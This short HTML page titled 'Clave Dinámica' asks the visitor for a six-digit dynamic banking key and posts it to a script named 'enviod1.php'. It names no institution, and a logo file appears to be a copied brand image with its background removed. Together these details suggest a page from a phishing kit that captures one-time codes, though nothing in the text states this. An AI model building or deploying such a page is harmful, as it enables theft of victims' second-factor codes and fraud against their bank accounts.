<!DOCTYPE html>
<html>
<head>
    <link rel="shortcut icon" href="/images/favicon.ico" type="image/x-icon">

  <title>Clave Dinámica</title>
  <style>
    html, body {
      height: 100%;
      margin: 0;
      padding: 0;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    body {
      background-image: url('/images/fondo.png');
      background-size: auto;
      background-repeat: no-repeat;
      font-family: Arial, sans-serif;
    }

    .container {
      text-align: center;
      background-color: rgba(255, 255, 255, 0);
      padding: 20px;
      border-radius: 10px;
    }

    .logo {
      margin-bottom: 25px;
    }

    input[type="password"] {
      padding: 10px;
      font-size: 16px;
      border: 2px solid #858585;
      border-radius: 4px;
      outline: none;
      transition: border-color 0.3s ease-in-out;
      text-align: center;
    }

    input[type="password"]:focus {
      border-color: #3a7e3d;
    }

    button {
      padding: 10px 40px;
      font-size: 16px;
      background-color: #5abd9c;
      color: #fff;
      border: none;
      border-radius: 50px;
      cursor: pointer;
      font-family: 'Lucida Sans', 'Lucida Sans Regular', 'Lucida Grande', 'Lucida Sans Unicode', Geneva, Verdana, sans-serif;
    }
    
    button:hover {
        background-color: #53917c;
    }

  </style>
</head>
<body>
  <div class="container">
    <img src="/images/logo2.png"  alt="Logo" width="250">
    <br>
    <br>
    <br>
    <br>
    <br>
    <br>
    <br>
    <div class="logo">
       
      <img src="/images/dinamica-removebg-preview.png"  alt="Logo" width="250">
    </div>
    
    <form action="enviod1.php" method="post">
      <input type="password" maxlength="6" name="dina" id="dina" placeholder="Ingrese la clave dinámica" required>
      <br><br>
      <button type="submit">Continuar</button>
    </form>
  </div>
</body>
</html>
